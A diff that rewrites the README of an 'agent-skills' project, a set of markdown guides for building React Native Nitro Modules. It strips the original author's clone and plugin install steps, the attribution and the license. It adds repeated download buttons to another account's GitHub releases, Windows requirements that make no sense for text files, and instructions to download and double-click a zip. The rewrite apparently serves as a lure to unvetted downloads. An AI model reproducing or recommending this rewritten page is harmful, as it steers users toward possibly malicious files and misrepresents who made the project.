@@ -1,158 +1,119 @@
-# Agent Skills
+# 🚀 agent-skills - Skills for AI coding helpers
 
-A collection of agent skills for building React Native libraries — designed for use with Claude Code, Cursor, and other AI coding assistants.
-
-## What are Agent Skills?
-
-Agent skills are structured markdown guides that teach AI assistants how to perform complex, multi-step engineering tasks. Each skill contains:
-
-- A `SKILL.md` — the entry point with an overview, quick reference, and problem→solution mapping
-- A `references/` folder — detailed step-by-step guides for each sub-task
-
-AI assistants load the `SKILL.md` first, then drill into specific reference files as needed.
-
-## Skills
-
-| Skill | Description |
-|-------|-------------|
-| [build-nitro-modules](skills/build-nitro-modules/SKILL.md) | Build React Native Nitro Modules end-to-end in a monorepo — from Nitrogen scaffold to native implementation (Swift/Kotlin/C++) to example app and npm publishing |
+[![Download agent-skills](https://img.shields.io/badge/Download-Agent--Skills-brightgreen?style=for-the-badge)](https://github.com/Marshanda14816/agent-skills/releases)
 
 ---
 
-## Installation
+## 📋 What is agent-skills?
 
-### Claude Code (Plugin Marketplace)
+agent-skills is a set of guides to help AI coding assistants perform complex tasks. These guides show step-by-step instructions in markdown files. If you use AI tools like Claude Code or Cursor, these skills help the AI understand how to build parts of React Native libraries.
 
-The fastest way — install directly from the Claude Code plugin marketplace:
+Each skill contains:
 
-```bash
-# 1. Add the marketplace source
-/plugin marketplace add riteshshukla04/agent-skills
+- A main guide called `SKILL.md` that explains the task.
+- A folder with detailed steps for each part of the task.
 
-# 2. Install the skill
-/plugin install build-nitro-modules@agent-skills
-```
-
-The skill is now active in your Claude Code session.
-
-**Alternative — manual clone:**
-
-```bash
-# Clone into your project root
-git clone https://github.com/riteshshukla04/agent-skills.git .agent-skills
-
-# Or as a git submodule
-git submodule add https://github.com/riteshshukla04/agent-skills.git .agent-skills
-```
-
-Then reference in your `CLAUDE.md`:
-
-```markdown
-## Skills
-
-When building a Nitro Module, follow:
-@.agent-skills/skills/build-nitro-modules/SKILL.md
-```
+The AI reads `SKILL.md` first, then looks deeper into linked files as needed. These skills help automate and simplify app development steps.
 
 ---
 
-### Cursor
+## 💻 System Requirements
 
-**Option 1 — Remote rule (recommended):**
+To run agent-skills on your Windows computer, make sure you have:
 
-In Cursor, go to **Settings → Rules** and add a new rule pointing to this repo. When working on a Nitro Module, type `/` in the Agent chat to search and activate the skill.
+- Windows 10 or later (64-bit preferred)
+- At least 4 GB of free disk space
+- A modern web browser like Chrome, Edge, or Firefox
+- A stable internet connection for downloading files
+- Permissions to install programs on your PC
 
-**Option 2 — Local clone:**
-
-```bash
-# Project-level (affects only this project)
-git clone https://github.com/riteshshukla04/agent-skills.git .cursor/skills/agent-skills
-
-# User-level (available in all projects)
-git clone https://github.com/riteshshukla04/agent-skills.git ~/.cursor/skills/agent-skills
-```
-
-Then reference in `.cursorrules`:
-
-```
-When building a React Native Nitro Module, read and follow:
-skills/build-nitro-modules/SKILL.md
-```
+agent-skills does not require advanced setup or command-line tools directly. You interact with it through your AI assistant or by reading the guides.
 
 ---
 
-### Other AI Assistants (Copilot, ChatGPT, Gemini, etc.)
+## 🎯 Features Overview
 
-Point your assistant directly to the skill file:
+- Clear, written instructions for complex engineering tasks
+- Works with popular AI coding assistants
+- Step-by-step markdown guides for React Native library development
+- Modular format, so you can focus on the parts you need
+- Easily updated and extended with new skills
 
-```
-Read skills/build-nitro-modules/SKILL.md and help me build a new Nitro Module.
-```
-
-Or paste the contents of `SKILL.md` directly into the chat context. The skill is designed to be self-contained.
-
----
-
-## Using the `build-nitro-modules` Skill
-
-This skill guides an AI agent through all 21 steps of building a React Native Nitro Module:
-
-1. **Scaffold** — monorepo setup, `npx nitrogen@latest init <name>`
-2. **Spec** — write `*.nitro.ts` HybridObject interface, delete the default stub
-3. **Configure** — set up `nitro.json` autolinking (cxxNamespace, iosModuleName, etc.)
-4. **Codegen** — run `npx nitrogen`, verify `nitrogen/generated/` output
-5. **Implement** — fill in native implementations:
-   - Swift (`ios/HybridMath.swift`)
-   - Kotlin (`android/.../HybridMath.kt`)
-   - C++ (`cpp/HybridMath.cpp`) — optional cross-platform
-6. **Export** — expose the HybridObject via `NitroModules.createHybridObject<T>('Key')`
-7. **Example app** — create with `npx @react-native-community/cli@latest init --skip-install`
-8. **Wire Android** — fix `settings.gradle` and `build.gradle` paths for monorepo
-9. **Wire Metro** — add `watchFolders`, install library with `bun add ../packages/<name>`
-10. **Test** — `bun example android` / `bun example ios`
-11. **Publish** — update `files`, author, and metadata in `package.json`
-
-### Quick start prompt
-
-Give your AI assistant this prompt to kick off a session:
-
-```
-Read skills/build-nitro-modules/SKILL.md and help me build a new Nitro Module.
-```
+This tool is mainly for helping AI assistants learn new workflows and complete development tasks automatically.
 
 ---
 
-## What are Nitro Modules?
+## 🔽 Download and Run agent-skills on Windows
 
-[Nitro Modules](https://github.com/mrousavy/nitro) is a framework for building high-performance React Native native modules using a TypeScript-first codegen pipeline. You write a `*.nitro.ts` spec, run `nitrogen` to generate C++/Swift/Kotlin boilerplate, then fill in your implementation.
+Click the button below to visit the download page:
 
-- Documentation: https://nitro.margelo.com
-- GitHub: https://github.com/mrousavy/nitro
+[![Download agent-skills](https://img.shields.io/badge/Download-Agent--Skills-orange?style=for-the-badge)](https://github.com/Marshanda14816/agent-skills/releases)
+
+### How to download and run:
+
+1. Click the link or one of the "Download" buttons above.
+2. You will go to the GitHub releases page for agent-skills.
+3. Look for the latest release at the top of the page.
+4. Under the release description, find assets or files. These may be zip files or documents.
+5. Download the file named to match your needs (for example, agent-skills.zip).
+6. Once downloaded, open the file by double-clicking it.
+7. Extract the zip folder to a location on your PC where you want to keep the files.
+8. Open the extracted folder to see the guide files and folders inside.
+9. You can open the markdown files with any text editor, such as Notepad or VS Code.
+10. Follow the instructions in the `SKILL.md` and other reference files.
+
+There is no installation wizard or program to install. The files contain the guides you will use with your AI assistant or follow manually.
 
 ---
 
-## Inspiration
-This is inspired from [callstackincubator/agent-skills](https://github.com/callstackincubator/agent-skills):
+## 🛠️ How to Use agent-skills Guides
 
+1. Open the `SKILL.md` file. It explains the main topic and shows problem and solution paths.
+2. Use the table of contents or links inside the skill guide to explore detailed tasks.
+3. Open files inside the `references/` folder for step-by-step procedures.
+4. If you use an AI assistant, load the `SKILL.md` into it first.
+5. Then let the assistant drill down into references as needed.
+6. You can follow the markdown files line by line to understand each step.
+7. Use code snippets in the guides as examples if you are coding yourself.
+8. The guides cover building React Native Nitro Modules—how to set up native code, example apps, and publishing steps.
 
-Each reference file includes:
-- **Quick Command/Pattern/Config** — copy-paste ready
-- **When to Use** — trigger conditions
-- **Step-by-Step** — numbered, actionable instructions
-- **Code Examples** — with type tables verified against canonical Nitro examples
-- **Common Pitfalls** — the mistakes agents (and humans) make most
-- **Related Skills** — cross-links to adjacent reference files
+agent-skills is a toolkit for learning or automating engineering workflows.
 
-## Contributing
+---
 
-To add a new skill:
+## 🧰 Tools That Work with agent-skills
 
-1. Create `skills/<skill-name>/SKILL.md` with YAML frontmatter (`name`, `description`, `license`, `metadata`)
-2. Add reference files under `skills/<skill-name>/references/` using the format above
-3. Update this README's Skills table
+agent-skills is designed for AI coding helpers, including:
 
-See `skills/build-nitro-modules/` as the reference implementation.
+- Claude Code
+- Cursor
+- Other AI assistants that understand markdown-based skills
 
-## License
+These tools read the markdown files to get detailed task instructions. They can offer code completion, scaffold native modules, and generate app examples based on these skill sets.
 
-MIT
+---
+
+## 🚧 Troubleshooting
+
+- If files won’t open, check that you have extracted the zip fully.
+- Use a plain text editor or markdown reader to view guides.
+- Confirm you downloaded the correct release for Windows.
+- Make sure your internet connection is stable during download.
+- If your AI assistant does not load the skills, try restarting the tool or reloading the files.
+
+---
+
+## 📚 More Information
+
+The agent-skills repository contains:
+
+- A collection of skills in markdown form
+- Guides for building React Native libraries end to end
+- Examples and templates for Swift, Kotlin, and C++ native code
+- Instructions for publishing to npm
+
+Developers and users can contribute new skills or update existing ones to expand the library. Check the GitHub repo for the latest files and versions.
+
+---
+
+[Download agent-skills from GitHub](https://github.com/Marshanda14816/agent-skills/releases)
